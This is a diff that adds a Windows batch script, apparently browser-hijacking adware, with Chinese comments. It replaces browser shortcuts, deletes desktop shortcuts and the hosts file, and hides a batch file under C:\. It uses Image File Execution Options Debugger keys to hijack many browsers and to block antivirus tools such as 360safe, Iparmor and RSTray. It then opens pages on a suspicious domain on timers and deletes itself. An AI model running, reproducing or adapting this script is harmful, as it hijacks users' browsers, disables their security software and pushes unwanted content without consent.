@@ -1,0 +1,173 @@
+::解开注册表
+reg  add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
+
+::去掉小箭头
+echo Windows Registry Editor Version 5.00 >%systemroot%\jiantou.reg
+echo [HKEY_CLASSES_ROOT\lnkfile]>>%systemroot%\jiantou.reg
+echo "IsShortcut"=->>%systemroot%\jiantou.reg
+echo [HKEY_CLASSES_ROOT\piffile]>>%systemroot%\jiantou.reg
+echo "IsShortcut"=->>%systemroot%\jiantou.reg
+regedit /s %systemroot%\jiantou.reg
+del /F /Q %systemroot%\jiantou.reg
+
+
+regedit /s key.reg
+
+
+::复制文件
+
+copy "Internet Explore.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorer 浏览器.lnk" /Y
+
+copy "Internet Explore.lnk" "C:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorer 浏览器.lnk" /Y
+
+copy "Internet Explore.lnk" "%USERPROFILE%\「开始」菜单\Internet Explore.lnk" /Y
+
+del "Internet Explore.lnk" "%USERPROFILE%\「开始」菜单\Internet Explorer.lnk"
+
+copy "Internet Explore.lnk" "%USERPROFILE%\「开始」菜单\程序\Internet Explore.lnk" /Y
+
+del "Internet Explore.lnk" "%USERPROFILE%\「开始」菜单\程序\Internet Explorer.lnk"
+
+del "%USERPROFILE%\桌面\网址大全.lnk"
+
+del "%ALLUSERSPROFILE%\桌面\网址大全.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\网址大全.lnk"
+
+del "%USERPROFILE%\桌面\365天网址.lnk"
+
+del "%USERPROFILE%\桌面\最新免费影视展播.lnk"
+
+del "%USERPROFILE%\桌面\i看影视.lnk"
+
+del "%USERPROFILE%\桌面\免费高清电影.lnk"
+
+del "%ALLUSERSPROFILE%\桌面\很快视频搜索.lnk"
+
+del "%USERPROFILE%\桌面\Internet Explore.lnk"
+
+del "%USERPROFILE%\桌面\Internet Explorer.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\365天网址.lnk"
+
+del "%USERPROFILE%\桌面\了解网址大全.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\了解网址大全.lnk"
+
+del "%USERPROFILE%\桌面\了解网址大全.lnk"
+
+del "%USERPROFILE%\桌面\IEXPLORE.EXE.lnk"
+
+del "%USERPROFILE%\桌面\IEXPLORE.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\IEXPLORE.lnk"
+
+del "%USERPROFILE%\桌面\Internet Explorer.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\Internet Explorer.lnk"
+
+del "%USERPROFILE%\桌面\*.url"
+
+del "C:\Documents and Settings\Administrator\桌面\*.url"
+
+del key.reg
+
+::删除host文件
+del %windir%\system32\drivers\etc\hosts
+
+ATTRIB +H +R +S +A c:\iexplor.bat
+
+del iexplor.bat
+
+::刷新（加服务）
+msiexec /regserver
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\theworld.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Maxthon.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TTraveler.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KylinBrowser.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vu.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MiniIE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\suda.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdoIE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360Start.exe" /v Debugger /t reg_sz /d C:\explor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360SE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iemate.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\IERepair.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GreenBrowser.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SaaYaa.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\XWebStar.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MyIE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TouchNet.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\See9IE.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\zhinanzhenbrowser.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\top.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avant.exe" /v Debugger /t reg_sz /d C:\iexplor.bat /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hsreg.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ruixing.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Iparmor.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ruixing.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360tray.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srgui.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sriecli.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safe.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winpatrol.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ruixing.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ast.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RSTray.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safebox.exe" /v Debugger /t reg_sz /d C:\WINDOWS\system32\ctfmon.exe /f
+
+
+::ATTRIB -H -R -S -A c:\GRLDR
+
+::del c:\GRLDR /S /Q
+
+::del C:\WINDOWS\system32\Restore /S /Q
+
+ping 127.0.0.1 /n 3600 >nul
+
+start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news1.html
+
+ping 127.0.0.1 /n 4000 >nul
+
+start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news2.html
+
+ping 127.0.0.1 /n 4600 >nul
+
+start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news3.html
+
+exit
+del %0%
